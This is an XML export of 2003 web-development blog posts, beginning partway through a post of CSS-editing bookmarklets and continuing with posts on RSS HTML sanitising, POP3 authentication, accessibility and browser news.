if(s.href.substr(0,5)!=&amp;quot;http:&amp;quot;){y.fulltext=&amp;quot;/* Non-http; imported above. */&amp;quot;;}else{var loadingText=&amp;quot;/* Loading (&amp;quot;+(L.length-1)+&amp;quot;) */&amp;quot;;y.fulltext=loadingText;var p=new XMLHttpRequest();p.onload=function(e){ta.value=ta.value.replace(y.importtext+newline,&amp;quot;&amp;quot;);y.fulltext=p.responseText;ta.value=ta.value.replace(loadingText,fix(y.fulltext));ta.value=ta.value.replace(firstNote+newline,&amp;quot;&amp;quot;);};p.open(&amp;quot;GET&amp;quot;,s.href);p.send(null);}}}}function fix(s){while((s[0]==newline)&amp;amp;&amp;amp;s.length&amp;gt;1)s=s.slice(1);while((s[s.length-1]==newline)&amp;amp;&amp;amp;s.length&amp;gt;1)s=s.substr(0,s.length-1);s=s.replace(/@import.*;/ig,function(){return &amp;quot;/* &amp;quot;+RegExp.lastMatch+&amp;quot; */&amp;quot;;});return s;}for(var i=0,ss;ss=x.document.styleSheets[i];++i)add(ss);var imports=&amp;quot;&amp;quot;,main=&amp;quot;&amp;quot;;var firstNote=&amp;quot;/**** Style sheets whose contents could be loaded were ****/&amp;quot;+newline+&amp;quot;/**** imported instead.  Rule order may be incorrect   ****/&amp;quot;+newline+&amp;quot;/**** as a result. ****/&amp;quot;+newline;if(importCount){ta.value+=firstNote;}for(var i=0;ss=L[i];++i){if(ss.importtext){imports+=ss.importtext+newline;}main+=&amp;quot;/**** &amp;quot;+ss.label+&amp;quot; style sheet&amp;quot;+ss.shorturl+&amp;quot; ****/&amp;quot;+newline;main+=newline;main+=ss.fulltext;main+=newline;main+=newline;main+=newline;}ta.value+=imports+newline+main;update();}function update(){try{if(!x||x.closed){ta.style.backgroundColor=&amp;quot;#ddd&amp;quot;;return;}x.editStyles;}catch(er){ta.style.backgroundColor=&amp;quot;#fdc&amp;quot;;setTimeout(update,150);dead=true;return;}if(dead){dead=false;ta.style.backgroundColor=&amp;quot;&amp;quot;;oldCSS=null;}if(!x.editStyles){var newSS;newSS=x.document.createElement(&amp;quot;style&amp;quot;);newSS.type=&amp;quot;text/css&amp;quot;;x.document.getElementsByTagName(&amp;quot;head&amp;quot;)[0].appendChild(newSS);x.editStyles=newSS;oldCSS=null;for(var i=0,ss;ss=x.document.styleSheets[i];++i)ss.disabled=true;}if(oldCSS!=ta.value){oldCSS=ta.value;x.editStyles.innerHTML=ta.value;}setTimeout(update,150);}y=open(&amp;apos;&amp;apos;,&amp;apos;&amp;apos;,&amp;apos;resizable,scrollbars=yes,width=550,height=520&amp;apos;);y.document.write(&amp;apos;&amp;lt;title&amp;gt;Edit Styles&amp;lt;/title&amp;gt;&amp;lt;style&amp;gt;.ec { width: 100%; height: 100%; border: none; margin: 0px; padding: 0px; }&amp;lt;/style&amp;gt;&amp;lt;body class=&amp;quot;ec&amp;quot;&amp;gt;&amp;lt;form name=&amp;quot;f&amp;quot; style=&amp;quot;margin: 0px;&amp;quot; class=&amp;quot;ec&amp;quot;&amp;gt;&amp;lt;textarea name=&amp;quot;ta&amp;quot; wrap=&amp;quot;soft&amp;quot; style=&amp;quot;margin: 0px; border: 0px; width:100%; height:100%;&amp;quot; class=&amp;quot;ec&amp;quot;&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;&amp;apos;+update+init+&amp;apos;init();&amp;lt;&amp;apos;+&amp;apos;/script&amp;gt;&amp;apos;);y.document.close();})()&quot;&gt;edit styles&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;javascript:(function(){function A(n,g){var p=n.parentNode,t=n.tagName;if(!p)return &amp;quot;&amp;quot;;if(!t)return A(p,g);var T=t.toUpperCase(),b=(T!=&amp;quot;TABLE&amp;quot;&amp;amp;&amp;amp;T!=&amp;quot;TBODY&amp;quot;&amp;amp;&amp;amp;T!=&amp;quot;THEAD&amp;quot;&amp;amp;&amp;amp;T!=&amp;quot;TR&amp;quot;),c=n.className,i=n.id;return A(p,&amp;apos; &amp;gt; &amp;apos;)+(b?T:T.toLowerCase())+(c?&amp;quot;.&amp;quot;+c:&amp;quot;&amp;quot;)+(i?&amp;quot;#&amp;quot;+i:&amp;quot;&amp;quot;)+(b?g:&amp;apos; &amp;apos;);}document.onmouseover=function(e){e=e?e:event;var s,g=e.target;g=g?g:e.srcElement;try{s=A(g,&amp;apos;&amp;apos;);}catch(err){s=err.message;}window.status=s;return true;};window.status=A(document.documentElement,&amp;apos;&amp;apos;);})()&quot;&gt;ancestors&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;javascript:(function(){var i,x;for(i=0;x=document.styleSheets[i];++i)x.disabled=true;})();&quot;&gt;zap style sheets&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;javascript:(function(){var H=[&amp;quot;bgcolor&amp;quot;,&amp;quot;bgColor&amp;quot;,&amp;quot;background&amp;quot;,&amp;quot;color&amp;quot;,&amp;quot;align&amp;quot;,&amp;quot;text&amp;quot;,&amp;quot;alink&amp;quot;,&amp;quot;vlink&amp;quot;],Y={FONT:1,CENTER:1},d=[],p; function R(N){var a,x,i,t; if(t=N.tagName){ t=t.toUpperCase(); for (i=0;a=H[i];++i)if(N.getAttribute(a))N.removeAttribute(a); for(i=0;x=N.childNodes[i];++i)R(x); if (Y[t])d.push(N); } } R(document.documentElement); for (i=0;N=d[i];++i) { p=N.parentNode; while(N.firstChild)p.insertBefore(N.firstChild,N); p.removeChild(N); } })()&quot;&gt;zap presentational html&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;javascript:s=document.getElementsByTagName(&amp;apos;STYLE&amp;apos;); ex=document.getElementsByTagName(&amp;apos;LINK&amp;apos;); d=window.open().document; /*set base href*/d.open();d.close(); b=d.body; function trim(s){return s.replace(/^\s*\n/, &amp;apos;&amp;apos;).replace(/\s*$/, &amp;apos;&amp;apos;); }; function iff(a,b,c){return b?a+b+c:&amp;apos;&amp;apos;;}function add(h){b.appendChild(h);} function makeTag(t){return document.createElement(t);} function makeText(tag,text){t=makeTag(tag);t.appendChild(document.createTextNode(text)); return t;} add(makeText(&amp;apos;style&amp;apos;, &amp;apos;iframe{width:100%;height:18em;border:1px solid;&amp;apos;)); add(makeText(&amp;apos;h3&amp;apos;, d.title=&amp;apos;Style sheets in &amp;apos; + location.href)); for(i=0; i&amp;lt;s.length; ++i) { add(makeText(&amp;apos;h4&amp;apos;,&amp;apos;Inline style sheet&amp;apos;  + iff(&amp;apos; title=&amp;quot;&amp;apos;,s[i].title,&amp;apos;&amp;quot;&amp;apos;))); add(makeText(&amp;apos;pre&amp;apos;, trim(s[i].innerHTML))); } for (i=0; i&amp;lt;ex.length; ++i) { rs=ex[i].rel.split(&amp;apos; &amp;apos;); for(j=0;j&amp;lt;rs.length;++j) if (rs[j].toLowerCase()==&amp;apos;stylesheet&amp;apos;) { add(makeText(&amp;apos;h4&amp;apos;,&amp;apos;link rel=&amp;quot;&amp;apos; + ex[i].rel + &amp;apos;&amp;quot; href=&amp;quot;&amp;apos; + ex[i].href + &amp;apos;&amp;quot;&amp;apos; + iff(&amp;apos; title=&amp;quot;&amp;apos;,ex[i].title,&amp;apos;&amp;quot;&amp;apos;))); iframe=makeTag(&amp;apos;iframe&amp;apos;); iframe.src=ex[i].href; add(iframe); break; } } void 0&quot;&gt;view style sheets&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;javascript:(function(){var newSS; newSS=document.createElement(&amp;quot;link&amp;quot;); newSS.rel=&amp;quot;stylesheet&amp;quot;; newSS.type=&amp;quot;text/css&amp;quot;; newSS.href = &amp;quot;http://www.cs.hmc.edu/~jruderma/block-structure.css&amp;quot;; document.documentElement.childNodes[0].appendChild(newSS); })();&quot;&gt;show blocks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now give them a go. They're all useful, but by far the most useful for learning &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; are &lt;strong&gt;test styles&lt;/strong&gt; and &lt;strong&gt;edit styles&lt;/strong&gt;. &lt;strong&gt;test styles&lt;/strong&gt; opens a popup window in which you can type &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; rules that will be applied instantly to the page you are viewing, while &lt;strong&gt;edit styles&lt;/strong&gt; does the same thing but pre-populates the window with the style sheets of the current site, allowing you to edit them in place. &lt;strong&gt;ancestors&lt;/strong&gt; is also useful; it shows the element hierarchy of the element your mouse is currently over, which can help you see what selector you need to use to modify that element's style. I cannot emphasize enough how powerful this is for working with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;; using &lt;strong&gt;test styles&lt;/strong&gt; I was able to &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/09/halfHourRedesign&quot; title=&quot;Half Hour Redesign&quot;&gt;redesign this site&lt;/a&gt; entirely in less than half an hour!&lt;/p&gt;

&lt;p&gt;All of the above bookmarklets were written by Jesse Ruderman. Jesse has many more bookmarklets, all of which are available on &lt;a href=&quot;http://www.squarefree.com/bookmarklets/&quot; title=&quot;&amp;gt;Jesse&amp;apos;s Bookmarklets Site&quot;&gt;his site&lt;/a&gt;. The bookmarklets listed above are from his &lt;a href=&quot;http://www.squarefree.com/bookmarklets/webdevel.html&quot; title=&quot;Web Development Bookmarklets&quot;&gt;Web Development collection&lt;/a&gt; (which includes further descriptions of these and many others). Jesse's bookmarklets have saved me countless hours of development time, and I hope they can do the same for you.&lt;/p&gt;</field>
		<field name="created">2003-06-03 13:49:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">993</field>
		<field name="title">Home improvements</field>
		<field name="slug">homeImprovements</field>
		<field name="body">&lt;p&gt;Exams are all over and I've had a few days of doing nothing to recuperate. I've also made a couple of small improvements to my blog. Firstly I've finally updated the comment system (after numerous vocal complaints) to provide a preview option and redisplay the form in the case  of invalid markup. I've also changed the &lt;a href=&quot;/archive/&quot; title=&quot;Archives&quot;&gt;monthly archive pages&lt;/a&gt; to display the titles of all of the posts from that month instead of just showing which days had entries. In my experience date based navigation is the least useful way of finding old content in a blog (search, categories and related reading are far more valuable) but the new way of presenting monthly archives at least gives an overall view of the topics I was posting about over a particular time period.&lt;/p&gt;</field>
		<field name="created">2003-06-10 15:35:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">994</field>
		<field name="title">Authentication via POP3</field>
		<field name="slug">pop3Authentication</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/203610&quot;&gt;Authenticating users through a third party POP3 server&lt;/a&gt; (Python sample code provided) is a really interesting idea, but one that I don't think could ever be used in the wild. Firstly, I haven't the slightest idea what my POP3 password is as I tend to save it in my mail application and forget about it. Secondly (and more importantly) is trust: how many web sites do I trust enough to give them my email password whenever I log in?&lt;/p&gt;

&lt;p&gt;That said, the author of the code snippet lists these and other weaknesses and seems to be suggesting that it would be best used in an intranet style environment, where it would allow web applications to authenticate using the company mail server thus avoiding administrators having to maintain multiple databases of user accounts.&lt;/p&gt;</field>
		<field name="created">2003-06-10 15:50:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">995</field>
		<field name="title">Under the Iron</field>
		<field name="slug">underTheIron</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://waffle.wootest.net/iron/&quot;&gt;Under the Iron&lt;/a&gt; is a series of interviews with interesting people. The most recent three include &lt;a href=&quot;http://waffle.wootest.net/iron/mark_pilgrim.php&quot; title=&quot;#6 dive into mark pilgrim&quot;&gt;one with Mark Pilgrim&lt;/a&gt;, which talks in part about Mark's reasons for creating &lt;a href=&quot;http://diveintoaccessibility.org/&quot;&gt;diveintoaccessibility&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://waffle.wootest.net/iron/mark_pilgrim.php&quot;&gt;&lt;p&gt;
I laugh when I hear people say &quot;I can't retrofit my web site, it's too expensive!&quot; Hey, you want retrofitting? People are tearing down walls and excavating and so forth to provide ramps, and wider aisles, and all sorts of other concessions to people with disabilities out in the real world. Don't tell me you can't afford to add a few extra tags. I mean, they're tags! Not even difficult ones. Here, I'll show you...
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The interview site makes interesting use of a style switcher combined with the Fahrner Image Replacement technique to provide an alternative &quot;image free&quot; version.&lt;/p&gt;</field>
		<field name="created">2003-06-10 16:10:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">996</field>
		<field name="title">Eric Meyer Redesigns</field>
		<field name="slug">meyerweb</field>
		<field name="body">&lt;p&gt;Eric Meyer has &lt;a href=&quot;http://www.meyerweb.com/eric/thoughts/2003b.html#t20030610&quot; title=&quot;Eos Rising&quot;&gt;released&lt;/a&gt; a new selection of designs over on &lt;a href=&quot;http://www.meyerweb.com/&quot;&gt;Meyerweb&lt;/a&gt;. The designs are inspiring, and Eric's CSS is well worth perusing for style tips and insights in to reliable methods of creating relatively complex layouts.&lt;/p&gt;</field>
		<field name="created">2003-06-11 23:59:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">997</field>
		<field name="title">Structured content defined</field>
		<field name="slug">structuredContent</field>
		<field name="body">&lt;p&gt;Peter Van Djick: &lt;a href=&quot;http://poorbuthappy.com/ease/001158.html&quot;&gt;The structure of content and metadata&lt;/a&gt;, a glossary style overview of important concepts in structured content and website metadata. Peter also links to Victor Lombardi's excellent &lt;a href=&quot;http://www.noisebetweenstations.com/personal/essays/metadata_glossary/metadata_glossary.html&quot;&gt;Metadata Glossary&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-06-12 09:39:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">998</field>
		<field name="title">Safely consuming RSS: RegExps don't cut it</field>
		<field name="slug">safelyConsuming</field>
		<field name="body">&lt;p&gt;Mark Pilgrim &lt;a href=&quot;http://diveintomark.org/archives/2003/06/12/how_to_consume_rss_safely.html&quot; title=&quot;How to consume RSS safely&quot;&gt;highlights&lt;/a&gt; the severe security issues introduced by &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; aggregators that display potentially unsafe &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;, often executing it in the &quot;secure zone&quot; generally reserved for trusted local documents. Mark suggests a number of dangerous tags and attributes that should be removed before display. Unsurprisingly, regular expressions have cropped up in the comments as the suggested solution. Jamie Zawinsky famously once posted the following to comp.lang.emacs:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;
Some people, when confronted with a problem, think &quot;I know, I'll use regular expressions.&quot; Now they have two problems.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;In this case, the above quote is particularly relevant. Parsing simple &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; with regular expressions is unpleasant but possible, but attempting to securely filter potentially malicious &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; (while trying to keep the useful tags) can only lead to more problems. There are just too many possible combinations, thanks mainly to the huge flexibility provided by modern browsers. Attributes can be left unquoted, tags can be left unclosed, characters can be incorrectly escaped; it all adds up to far more variables than even the most comprehensive regexps can hope to match. Combine this with the fact that Internet Explorer for Windows has not only the most forgiving parser but also the most &lt;a href=&quot;http://www.pivx.com/larholm/unpatched/&quot; title=&quot;Unpatched IE security holes&quot;&gt;unpatched security holes&lt;/a&gt; and you're looking at a very big problem.&lt;/p&gt;

&lt;p&gt;The solution is to use a real &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; parser. Python users have the excellent &lt;a href=&quot;http://www.python.org/doc/current/lib/module-sgmllib.html&quot;&gt;sgmllib&lt;/a&gt; (although I'm not sure how robust it is when faced with truly unpleasant &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;) but other developers are not so lucky - I'm sure &lt;a href=&quot;http://www.cpan.org/&quot;&gt;CPAN&lt;/a&gt; has some good solutions for Perl but if you're stuck with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; your best bet is probably something based on &lt;a href=&quot;http://traumwind.de/computer/php/REX/&quot;&gt;REX&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;At any rate, the parser you use had better be as foriving as &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; or it could miss out on damaging code. The easiest option is to strip HTML entirely, but doing so means greatly reducing the usefulness of the content that comes in through the aggregator. Alternatively, strip all but the bare essentials and use some heavy handed techniques to eliminate anything that could possibly be damaging. The latter approach could conceivably be achieved using regular expressions but would require some serious testing to stop up any leaks.&lt;/p&gt;</field>
		<field name="created">2003-06-12 22:07:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">999</field>
		<field name="title">Official film sites almost always suck</field>
		<field name="slug">filmSitesThatSuck</field>
		<field name="body">&lt;p&gt;Why do official film sites almost always suck? &lt;a href=&quot;http://www.x2-movie.com/&quot;&gt;www.x2-movie.com&lt;/a&gt; is a prime example: 100% Flash, ridiculous loading times (and I'm on broadband), totally unintuitive interface, tedious, unnecessary animations every time you click on anything and when you finally get to the content (all I could find was the &quot;Mutant Database&quot;) it gives you hardly any information above what you get by watching the film! It looks pretty (pretty expensive at any rate) but really is nothing more than a glorified trailer.&lt;/p&gt;

&lt;p&gt;I was going to cite &lt;a href=&quot;http://www.starwars.com/&quot;&gt;starwars.com&lt;/a&gt; as an example of a film site done right, but then I discovered they've redesigned it to be more graphics heavy and less easy to navigate. The content is still a hundred times better than comparable sites though.&lt;/p&gt;

&lt;p&gt;For a real laugh though, take a look at the official site for &lt;a href=&quot;http://www.thematrix.com/&quot;&gt;The Matrix&lt;/a&gt;. My attempt to view the &quot;lite&quot; version was met with &quot;The Lite version of the site is not fully supported by Netscape 4.7 or other older browsers&quot; (this is using the latest version of Firebird). Dodgy browser detection aside, the main navigation in both high and low bandwidth versions consists of a number of small TV monitors with a mouseover effect that results in the screen becoming blurry. A TV screen the other side of the screen indicates where each link will take you, but on my first visit to the site I struggled with the navigation for quite a while before resorting to trial and error, having missed the screen with the link information. Once you find the content it's pretty good (though generally quite out of date) but it's almost entirely obscured by the dreadful navigation system.&lt;/p&gt;

&lt;p&gt;If these sites were being put together on a shoe string I could almost forgive the laughable browser support and terrible interfaces, but it's obvious from the scale of the films that these are not low budget projects. It's nice to know that there are some competent firms like &lt;a href=&quot;http://www.happycog.com/&quot;&gt;Happy Cog&lt;/a&gt; involved in the industry, but they seem to be few and far between.&lt;/p&gt;</field>
		<field name="created">2003-06-12 22:35:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1000</field>
		<field name="title">One year of blogging</field>
		<field name="slug">oneYearOfBlogging</field>
		<field name="body">&lt;p&gt;Today marks the first anniversary of &lt;a href=&quot;http://simon.incutio.com/archive/2002/06/12/&quot; title=&quot;Archive: 12th June 2002&quot;&gt;the start of my blog&lt;/a&gt; (and, by a slightly contrived coincidence, my thousandth blog entry). It's been a fun year. Here are my highlights - if you can't stand lengthy self-congratulatory bullet points, stop reading now.&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;My &lt;a href=&quot;http://simon.incutio.com/archive/2002/06/12/webStandards&quot; title=&quot;WaSP Phase II&quot;&gt;first post&lt;/a&gt; covered the launch of phase two of the Web Standards project. I can remember agonising over a first post for ages, before eventually copping out and going for something dull but unchallenging.&lt;/li&gt;
 &lt;li&gt;A few days later I had my first weblog driven discussion, a &lt;a href=&quot;http://simon.incutio.com/archive/2002/06/13/hixieOnWaSP&quot; title=&quot;Hixie on WaSP&quot;&gt;debate with Hixie&lt;/a&gt; about standards compliance. Unsurprisingly, I lost - but it took me nearly a year to properly understand &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/06/knifeEdge&quot; title=&quot;Living on a knife edge&quot;&gt;the issues involved&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;The 24th of June saw my &lt;a href=&quot;http://simon.incutio.com/archive/2002/06/24/glastonburyFlash&quot; title=&quot;Glastonbury Flash&quot;&gt;first rant about website usability&lt;/a&gt; with respect to the Glastobury festival site: amazingly the rant drew a response from the creator in October of that year.&lt;/li&gt;
 &lt;li&gt;My &lt;a href=&quot;http://simon.incutio.com/archive/2002/07/11/aMillionPoundsDownTheDrain&quot; title=&quot;A million pounds down the drain&quot;&gt;second rant&lt;/a&gt; was aimed at a far more deserving target: &lt;a href=&quot;http://www.connected-earth.com/&quot;&gt;Connected Earth&lt;/a&gt;, whose site was so terrible it ended up as an example of what &lt;em&gt;not&lt;/em&gt; to do in Jeffrey Zeldman's &lt;a href=&quot;http://www.zeldman.com/dwws/&quot; title=&quot;Designing with web standards&quot;&gt;new book&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;On the 6th of July I &lt;a href=&quot;http://simon.incutio.com/archive/2002/07/06/betterBlogrolling&quot; title=&quot;Better blogrolling&quot;&gt;discovered blo.gs&lt;/a&gt;; I've been using it to power my blogroll ever since.&lt;/li&gt;
 &lt;li&gt;The 10th of July saw my first published &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; experiment: &lt;a href=&quot;http://simon.incutio.com/archive/2002/07/10/numberedCodeListing&quot;&gt;Numbered code listings&lt;/a&gt;. It's cropped up in a few different places since then.&lt;/li&gt;
 &lt;li&gt;Around the 14th, I &lt;a href=&quot;http://simon.incutio.com/archive/2002/07/14/&quot;&gt;discovered wikis&lt;/a&gt;, setting up the initial MACCAWS wiki and the &lt;a href=&quot;http://smarty.incutio.com/&quot;&gt;Smarty wiki&lt;/a&gt;, which is still going strong.&lt;/li&gt;
 &lt;li&gt;Amazon launched their &lt;a href=&quot;http://associates.amazon.com/exec/panama/associates/join/developer/resources.html&quot;&gt;Web Service API&lt;/a&gt; on the 17th, and I &lt;a href=&quot;http://simon.incutio.com/archive/2002/07/17/amazonWebServices&quot; title=&quot;Amazon web services&quot;&gt;released&lt;/a&gt; a PHP &lt;a href=&quot;http://scripts.incutio.com/amazon/&quot; title=&quot;PHP Amazon Search&quot;&gt;sample implementation&lt;/a&gt; on the same day.&lt;/li&gt;
 &lt;li&gt;I &lt;a href=&quot;http://simon.incutio.com/archive/2002/08/12/archivistGoesLive&quot; title=&quot;Archivist goes live&quot;&gt;launched Archivist in August&lt;/a&gt;, the mailing list archive system used for the &lt;a href=&quot;http://archivist.incutio.com/viewlist/css-discuss/&quot;&gt;css-discuss archive&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;September 2nd was another active day: I released the &lt;a href=&quot;http://simon.incutio.com/archive/2002/09/02/aNewXMLRPCLibraryForPHP&quot; title=&quot;A new XML-RPC library for PHP&quot;&gt;initial version of my XML-RPC library&lt;/a&gt;, and used it to create the &lt;a href=&quot;http://simon.incutio.com/archive/2002/09/02/pingBackImplemented&quot; title=&quot;Pingback implemented&quot;&gt;first Pingback implementation&lt;/a&gt;, based on an idea by &lt;a href=&quot;http://www.keyogenix.org/&quot;&gt;Stuart&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Towards the end of September I started an ill-fated experiment in &lt;a href=&quot;http://simon.incutio.com/archive/2002/09/23/bloggingMyLectureNotes&quot;&gt;blogging my lecture notes&lt;/a&gt;. I soon realised that lecture notes work better when confined to a &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/notes/&quot;&gt;separate site&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;My big project for October was the &lt;a href=&quot;http://css-discuss.incutio.com/&quot;&gt;css-discuss wiki&lt;/a&gt;, &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/11/cssWikiLive&quot; title=&quot;The css-discuss Wiki is now live&quot;&gt;launched on the 11th&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Later in October came my experimental &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/28/w3cValidatorWebService&quot;&gt;XML-RPC interface to the W3C HTML validator&lt;/a&gt;. I keep meaning to return to that and finish it off.&lt;/li&gt;
 &lt;li&gt;In November I &lt;a href=&quot;http://simon.incutio.com/archive/2002/11/28/phpTrainingUpdate&quot; title=&quot;PHP training update&quot;&gt;attempted to run&lt;/a&gt; a PHP training course, and found that it was harder than I thought it would be. The training material I wrote is &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/php-training/&quot; title=&quot;PHP Training: Introduction&quot;&gt;still available though&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;I released &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/20/blockquoteCitations&quot;&gt;Blockquote Citations&lt;/a&gt; in December, my first useful Javascript hack.&lt;/li&gt;
 &lt;li&gt;In January I &lt;a href=&quot;http://simon.incutio.com/archive/2003/01/29/switched&quot; title=&quot;Switched&quot;&gt;switched to Linux&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;The two big hacks for February were my &lt;a href=&quot;http://simon.incutio.com/archive/2003/02/13/bookmarkletFixed&quot;&gt;Image Drag bookmarklet&lt;/a&gt; and &lt;a href=&quot;http://simon.incutio.com/archive/2003/02/23/safeHtmlChecker&quot;&gt;Safe HTML Checker&lt;/a&gt; class for my comments system.&lt;/li&gt;
 &lt;li&gt;March was a month for playing with Javascript: I released a &lt;a href=&quot;http://simon.incutio.com/archive/2003/03/18/phpAndJavascriptSpellChecker&quot;&gt;PHP/Javascript spell checker&lt;/a&gt; and &lt;a href=&quot;http://simon.incutio.com/archive/2003/03/25/getElementsBySelector&quot;&gt;getElementsBySelector&lt;/a&gt;, my most ambitious piece of javascript to date.&lt;/li&gt;
 &lt;li&gt;Also in March, I &lt;a href=&quot;http://simon.incutio.com/archive/2003/03/04/BCSS&quot;&gt;announced BCSS&lt;/a&gt; - the new Computer Science society at my University.&lt;/li&gt;
 &lt;li&gt;In April I released a bunch of PHP hacks, the most important being &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/06/httpClient&quot;&gt;HttpClient&lt;/a&gt;, followed by code for &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/23/conditionalGet&quot;&gt;supporting conditional GET&lt;/a&gt; and an &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/29/xmlWriter&quot;&gt;XMLWriter class&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Finally, in May a &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/04/structuralMarkup&quot;&gt;rant about structural markup&lt;/a&gt; lead to my &lt;a href=&quot;http://simon.incutio.com/categories/csstutorial/&quot;&gt;CSS tutorial series&lt;/a&gt;, of which there is plenty more on the way.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I've gained a huge amount from the last year, thanks almost entirely to the many excellent bloggers who have inspired me along the way (most of whom are listed on my blogroll). Here's to another exciting year.&lt;/p&gt;</field>
		<field name="created">2003-06-12 23:59:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1001</field>
		<field name="title">The reason monopolies are a bad idea</field>
		<field name="slug">monopolies</field>
		<field name="body">&lt;p&gt;I wasn't planning to cover the recent AOL and Microsoft announcements as they've been covered to death elsewhere by people with far more insight than myself, but this third piece of news seems to bring things to a head: Microsoft have announced &lt;a href=&quot;http://tantek.com/log/2003/06.html#endofmacie&quot;&gt;the end of development of Internet Explorer for the Mac&lt;/a&gt;. I've never really had access to this browser but I've read enough to know that it was the first full browser release to take web standards seriously, and as such plays a very important part in the history of the web standards movement. It's sad to see it come to an end, but it also raises yet more questions about the direction Microsoft is taking with regards to the web.&lt;/p&gt;

&lt;p&gt;In case you haven't heard, Microsoft &lt;a href=&quot;http://money.cnn.com/2003/05/29/technology/microsoft/&quot;&gt;paid off AOL&lt;/a&gt; a few weeks ago to the tune of &lt;strong&gt;$750,000,000&lt;/strong&gt;. In return, they got rid of the ongoing lawsuit concerning their illegal use of their desktop monopoly to crush Netscape, and more importantly gave AOL the &quot;right&quot; to use &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; as the browser for the AOL software for the next 7 years. Seeing as AOL own Netscape and most Mozilla development is still carried out by full time Netscape engineers, this has raised doubts about how long AOL will continue to fund development of everyone else's favourite browser.&lt;/p&gt;

&lt;p&gt;The real stinker though is the revelation that Microsoft are &lt;a href=&quot;http://news.com.com/2100-1032_3-1011859.html?tag=fd_top&quot; title=&quot;Microsoft to abandon standalone IE&quot;&gt;abandoning development&lt;/a&gt; of the stand along version of Internet Explorer for Windows. IE 6 is all we're getting - if you want a better version of Microsoft's browser you'll need to upgrade your operating system, as future browser versions will be an integral part of the &lt;acronym title=&quot;Operating System&quot;&gt;OS&lt;/acronym&gt;. When you consider the number of people still using Windows 98 (for example, every PC in the Library at &lt;a href=&quot;http://www.bath.ac.uk/&quot;&gt;my University&lt;/a&gt;) it's likely to take upwards of 5 years from the release of a new Windows OS for it to achieve a significant market share. The upside of this is that we're stuck with IE6 for the best part of the decade.&lt;/p&gt;

&lt;p&gt;This is incredibly bad news. &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;'s support for modern standards, while verging on adequate, is still severely lacking. It's not just niceties such as alpha-transparent PNGs and &lt;code class=&quot;css&quot;&gt;position: fixed&lt;/code&gt;; the browser is littered with bugs that make writing complex CSS for it a minefield, and has a number of well documented flaws (such as the inability to enlarage pixel sized fonts) that consistently require workarounds. It doesn't even support the &lt;code class=&quot;html&quot;&gt;&amp;lt;abbr&amp;gt;&lt;/code&gt; tag!&lt;/p&gt;

